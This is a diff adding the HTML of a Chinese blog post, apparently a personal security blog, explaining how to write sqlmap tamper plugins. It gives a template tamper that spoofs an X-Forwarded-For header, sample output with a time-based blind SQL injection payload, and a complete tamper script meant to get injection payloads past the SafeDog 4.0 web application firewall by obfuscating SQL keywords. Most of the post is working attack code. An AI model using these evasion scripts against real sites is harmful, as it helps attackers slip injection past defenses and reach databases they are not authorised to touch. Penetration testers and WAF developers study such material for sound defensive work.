@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+
+<title>sqlmap插件编写 | langke Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+</head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">langke&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">langke&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div id="post-toc" class="post-toc">
+            <span class="post-toc-title">catalogue</span>
+            <div class="post-toc-content">
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#常见工具-sqlmap插件编写"><span class="toc-text">常见工具-sqlmap插件编写</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#简介"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编写"><span class="toc-text">编写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#示例"><span class="toc-text">示例</span></a></li></ol></li></ol>
+            </div>
+        </div>
+    
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">sqlmap插件编写</h1>
+            
+                <div class="post-meta">
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">06 23&nbsp;&nbsp;22:18:36</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <section class="post-content">
+            <h1 id="常见工具-sqlmap插件编写"><a href="#常见工具-sqlmap插件编写" class="headerlink" title="常见工具-sqlmap插件编写"></a>常见工具-sqlmap插件编写</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>sqlmap是一个sql注入神器。<br>tamper是它的插件模块，用来对sql注入请求进行一些处理，一般用来绕过WAF。<br>脚本路径： <code>sqlmap\tamper</code><br>自定义的tamper文件放到脚本路径下即可调用。<br>调用命令： <code>--tamper=脚本文件名</code></p>
+<h2 id="编写"><a href="#编写" class="headerlink" title="编写"></a>编写</h2><p>基本格式</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line">// 调用当前脚本的优先级 PRIORITY.LOW，详细分级情况如下，值越小，优先级越低</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">class PRIORITY(object):</span></span><br><span class="line"><span class="string">    LOWEST = -100</span></span><br><span class="line"><span class="string">    LOWER = -50</span></span><br><span class="line"><span class="string">    LOW = -10</span></span><br><span class="line"><span class="string">    NORMAL = 0</span></span><br><span class="line"><span class="string">    HIGH = 10</span></span><br><span class="line"><span class="string">    HIGHER = 50</span></span><br><span class="line"><span class="string">    HIGHEST = 100</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">__priority__=PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line">// 函数声明该脚本适用或不适用的范围，可以为空。</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">// tamper是主要的函数，接受的参数为payload和**kwargs，返回值为替换后的payload</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string"> paylaod参数为 sql注入时的payload，是一个字符串。比如： </span></span><br><span class="line"><span class="string"> http://wwww.test.com/index.php?a=1' and 1=2%23</span></span><br><span class="line"><span class="string"> 其中payload为： ' and 1=2%23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">**kwargs是一个字典，其中包括请求头、delimiter（分隔符）、hints（提示）等键</span></span><br><span class="line"><span class="string">类似： &#123;'headers': &#123;&#125;, 'delimiter': '&amp;', 'hints': &#123;&#125;&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    payload = payload+<span class="string">"/**/"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"*"</span>*<span class="number">5</span>,payload,<span class="string">"*"</span>*<span class="number">5</span> </span><br><span class="line">    kwargs[<span class="string">'headers'</span>][<span class="string">'X-Forwarded-For'</span>] = <span class="string">'127.0.0.1'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"*"</span>*<span class="number">5</span>, kwargs, <span class="string">"*"</span>*<span class="number">5</span></span><br><span class="line">    // 必须返回payload</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
+<p>上面脚本输出内容部分截取：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[22:10:26] [INFO] testing &apos;Microsoft SQL Server/Sybase time-based blind (IF)&apos;</span><br><span class="line">***** name) WAITFOR DELAY &apos;0:0:5&apos; AND (1492=1492/**/ *****</span><br><span class="line">***** &#123;&apos;headers&apos;: &#123;&apos;X-Forwarded-For&apos;: &apos;127.0.0.1&apos;&#125;, &apos;delimiter&apos;: &apos;&amp;&apos;, &apos;hints&apos;: &#123;&#125;&#125; *****</span><br><span class="line">[22:10:26] [PAYLOAD] name) WAITFOR DELAY &apos;0:0:5&apos; AND (1492=1492/**/</span><br></pre></td></tr></table></figure></p>
+<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload,**kwargs)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        bypass_SafeDog_str = <span class="string">"/*x^x*/"</span> <span class="comment"># 一个干扰字符</span></span><br><span class="line">        payload=payload.replace(<span class="string">"UNION"</span>,bypass_SafeDog_str+<span class="string">"UNION"</span>+bypass_SafeDog_str) <span class="comment"># 在UNION的左右两边添加干扰字符</span></span><br><span class="line">        payload=payload.replace(<span class="string">"SELECT"</span>,bypass_SafeDog_str+<span class="string">"SELECT"</span>+bypass_SafeDog_str) <span class="comment"># 同上，</span></span><br><span class="line">        payload=payload.replace(<span class="string">"AND"</span>,bypass_SafeDog_str+<span class="string">"AND"</span>+bypass_SafeDog_str) <span class="comment"># 同上，</span></span><br><span class="line">        payload=payload.replace(<span class="string">"="</span>,bypass_SafeDog_str+<span class="string">"="</span>+bypass_SafeDog_str) <span class="comment"># 将空格替换成干扰字符</span></span><br><span class="line">        payload=payload.replace(<span class="string">" "</span>,bypass_SafeDog_str)</span><br><span class="line">        payload=payload.replace(<span class="string">"information_schema."</span>,<span class="string">"%20%20/*!%20%20%20%20INFOrMATION_SCHEMa%20%20%20%20*/%20%20/*^x^^x^*/%20/*!.*/%20/*^x^^x^*/"</span>) <span class="comment"># 将information_schema.这个关键字替换成URL编码后的内容</span></span><br><span class="line">        payload=payload.replace(<span class="string">"FROM"</span>,bypass_SafeDog_str+<span class="string">"FROM"</span>+bypass_SafeDog_str) <span class="comment"># 同样替换</span></span><br><span class="line">        <span class="comment">#print "[+]THE PAYLOAD RUNNING...Bypass safe dog 4.0 apache version ."</span></span><br><span class="line">        <span class="keyword">print</span> payload <span class="comment"># 输出Payload </span></span><br><span class="line">    <span class="keyword">return</span> payload <span class="comment"># 返回Payload</span></span><br></pre></td></tr></table></figure>
+        </section>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+
+            </section>
+        
+
+        <!--
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/sqlmap/"># sqlmap</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        -->
+        <!--
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2100/11/03/软件官网下载地址/">软件官网下载地址</a>
+            
+            
+            <a class="next" rel="next" href="/2020/06/21/PYTHON官方手册目录和地址/">PYTHON官方手册目录和地址</a>
+            
+        </section>
+        -->
+
+    </article>
+</div>
+
+        </div>
+        <!--
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© langke | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    	-->
+
+    	<br>
+    	<br>
+    	<br>
+
+
+
+    </div>
+</body>
+</html>
